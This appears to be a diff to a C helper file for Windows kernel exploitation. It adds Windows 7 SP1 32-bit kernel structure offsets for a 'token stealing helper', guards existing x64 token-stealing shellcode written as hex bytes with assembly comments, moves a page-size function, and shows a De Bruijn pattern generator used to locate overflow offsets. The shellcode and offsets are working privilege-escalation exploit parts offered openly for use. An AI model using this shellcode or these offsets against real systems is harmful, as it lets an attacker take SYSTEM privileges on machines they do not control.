@@ -193,9 +193,9 @@ void PopupCmd()
  * Token stealing helper
  */
 
-#ifdef __WIN81__
+#if defined(__WIN81__)
 
-#ifdef __X86_64__
+#if defined(__X86_64__)
 #define KIINITIAL_THREAD  "\x88\x01"  // 0x0188
 #define EPROCESS_OFFSET   "\xb8\x00"  // 0x00b8
 #define PROCESSID_OFFSET  "\xe0\x02"  // 0x02e0
@@ -204,8 +204,18 @@ void PopupCmd()
 #define SYSTEM_PID        "\x04"
 #endif
 
-// TODO: get more offsets from others Windows versions
+#elif defined(__WIN7SP1__)
 
+#if defined(__X86_32__)
+#define KTHREAD_OFFSET    "\x24\x01"   // 0x124
+#define EPROCESS_OFFSET   "\x50\x05"   // 0x050
+#define PID_OFFSET        "\xb4\x00"   // 0x0B4
+#define FLINK_OFFSET      "\xb8\x00"   // 0x0B8
+#define TOKEN_OFFSET      "\xf8\x00"   // 0x0F8
+#define SYSTEM_PID        "\x04"       // 0x004
+#endif
+
+// TODO: get more offsets from others Windows versions
 #endif
 
 
@@ -213,6 +223,7 @@ void PopupCmd()
  * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
  */
 const char StealTokenShellcode[] = ""
+#ifdef __X86_64__
         "\x50"                                                      // push rax
         "\x53"                                                      // push rbx
         "\x51"                                                      // push rcx
@@ -233,20 +244,10 @@ const char StealTokenShellcode[] = ""
         "\x58\x58\x58\x58\x58"                                      // pop rax; pop rax; pop rax; pop rax; pop rax;
         "\x48\x31\xc0"                                              // xor rax, rax
         "\xc3"                                                      // ret
+#endif
         "";
 
 #define StealTokenShellcodeLength sizeof(StealTokenShellcode)
-
-
-/**
- * System info
- */
-DWORD GetPageSize()
-{
-        SYSTEM_INFO siSysInfo;
-        GetSystemInfo(&siSysInfo);
-        return siSysInfo.dwPageSize;
-}
 
 
 /**
@@ -300,4 +301,16 @@ LPSTR CreateDeBruijnPatternEx(DWORD dwSize, DWORD dwPeriod)
 LPSTR CreateDeBruijnPattern(DWORD dwSize)
 {
         return CreateDeBruijnPatternEx(dwSize, sizeof(uintptr_t));
+}
+
+
+
+/**
+ * System info
+ */
+DWORD GetPageSize()
+{
+        SYSTEM_INFO siSysInfo;
+        GetSystemInfo(&siSysInfo);
+        return siSysInfo.dwPageSize;
 }
